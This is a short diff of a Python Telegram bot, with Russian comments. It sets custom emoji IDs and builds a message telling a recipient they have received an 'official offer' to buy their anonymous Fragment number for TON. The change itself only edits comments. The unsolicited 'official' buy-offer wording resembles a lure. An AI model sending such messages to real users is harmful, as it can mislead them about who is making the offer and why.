@@ -19,6 +19,7 @@ CUSTOM_EMOJI_ID = "6023826881160157558"
 FRAGMENT_ICON_ID = "6014820764237171679"
 WALLET_ICON_ID = "5987635334945444280"
 
+# Твой ID + синий ромб (как было раньше)
 CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">💎</tg-emoji>'
 
 async def safe_delete(chat_id, message_id, conn_id=None):
@@ -70,7 +71,6 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # ТЕКСТ С ЭМОДЗИ И БЕЗ ССЫЛКИ
     offer_text = (
         f"{CUSTOM_EMOJI} Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
